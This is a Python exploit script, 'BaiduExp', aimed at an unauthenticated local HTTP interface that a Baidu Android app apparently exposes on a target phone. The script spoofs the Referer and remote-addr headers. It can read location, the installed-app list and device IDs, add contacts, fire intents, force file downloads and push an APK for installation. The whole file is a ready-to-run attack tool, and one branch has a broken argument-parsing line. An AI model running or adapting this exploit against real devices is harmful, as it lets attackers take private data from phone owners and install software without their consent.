#!/usr/bin/python
#encoding=utf8
from optparse import OptionParser
from json import JSONEncoder
import requests
import sys
import subprocess
class BaiduExp:
    commands = ["geolocation", "getsearchboxinfo", "getapn", "getserviceinfo", "getpackageinfo", "sendintent", "getcuid", "getlocstring", "scandownloadfile", "addcontactinfo", "getapplist", "downloadfile", "uploadfile"]
    matchUrl = "http://www.baidu.com/"
    def __init__(self, target, port, isRefCap=True):
        self.target = target
        self.port = port
        if (isRefCap):
            self.headers = {'Referer': self.matchUrl}
        else:
            self.headers = {'referer': self.matchUrl}
        self.headers.update({'remote-addr':'127.0.0.1'})#add in new Baidumap v8.5
        self.payload = {'callback':'xxx', 'mcmdf':'inapp_xxx'}
    def __getTargetUrl(self, command):
        if (command in self.commands):
            targetUrl = "http://" + self.target + ":" + self.port + "/"+command 
            return targetUrl
        else:
            print "Error! Command not found"
            exit(-1)
    def sendpayload(self, command, params=None):
        url = self.__getTargetUrl(command)
        if(url != None):
            if(command == 'sendintent'):
                self.payload['intent'] = params 
            elif(command == 'addcontactinfo'):
                contact_list = params.split(',') # support mulitiple contact add, but now we just test 1 in the form of <name,number>
                contact_item = [{'name':contact_list[0],'starred':1,'fields':[{'type':'phone', 'type_code':2, 'type_ext':2, 'value':contact_list[1]}]}]
                data = JSONEncoder(sort_keys=True).encode(contact_item)
                self.payload['postdata'] = data 
            elif(command == 'getpackageinfo'):
                self.payload['packagename'] = params
            elif(command == 'downloadfile'):
                download_params = params.split(',') #in the form of (download or qurey),downloadurl,savepath
                self.payload['querydown'] = download_params[0] 
                self.payload['downloadurl'] = download_params[1]
                self.payload['savepath'] = download_params[2]
                self.payload['filesize'] = '1233' # just a magic number
            elif(command == 'uploadfile'): 
                upload_params = params.split(',') #in the form of Filename,install_type(onlyroot, all) 
                self.payload['Filename'] = upload_params[0]
                self.payload['install_type'] = upload_params[1]
                url = url + "?"
                for(x,y) in self.payload.items():
                    url = url + x +"=" +y +"&"
                print url
                return subprocess.check_output(["curl","-F","file=@1.apk","-e",self.matchUrl,url]) # use curl instead of requests               
            elif(command == 'scandownloadfile'):
                ll = params.split(',')
                self.payload['intent'] = ll.argv[0]
                self.payload['apkfilelength'] = ll.argv[1]
                self.payload['apkfilename'] = ll.argv[2]
                self.payload['apkpackagename'] = ll.argv[3]
            try:
                r = requests.get(url, params = self.payload, headers = self.headers, timeout=10) 
                print r.status_code, r.url
                return r.text
            except Exception as e:
                return e
def main():
    usage ='''
       BaiduExp:  Exploiting baidu Android App for its unauthorized interface!
        usage: %prog -c [cmd] -p [param1[,param2]...] [ip] [port]
        cmd including:
            geolocation, getsearchboxinfo, getapn, getserviceinfo, getpackageinfo, sendintent, getcuid, getlocstring, scandownloadfile, addcontactinfo, getapplist, downloadfile, uploadfile
        cmd with params:
            sendintent -p [intent uri]
            addcontactinfo -p [usrname],[phone number]
            getpackageinfo -p [package name]
            downloadfile -p [download or query],[downloadurl],[savepath])
            uploadfile -p [filename],[install_type(onlyroot,all)]
            scandownloadfile -p [intent],[apkfilelength],[apkfilename],[apkpackagename]
        for example: python %prog  -c sendintent -p http://www.sina.com  192.168.1.150 6259'''
    parser = OptionParser(usage)
    parser.add_option("-c", "--cmd", action="store", type="choice", dest="command", choices=BaiduExp.commands)
    parser.add_option("-p", "--params", action="store", type="string", dest="params", help="parameters for specific command") 
    parser.add_option("-R", action="store_true", dest="CapitalizedReferer", default=False, help="Set payload's Referer of referer") 
    (options, args) = parser.parse_args()
    if(len(args) != 2): 
        parser.error("Should set [ip] [port] of target!")
    else:
        (ip, port) = tuple(args)
        fuckbd = BaiduExp(ip,port,options.CapitalizedReferer)
        print fuckbd.sendpayload(options.command,options.params)
if __name__=='__main__': 
    main()
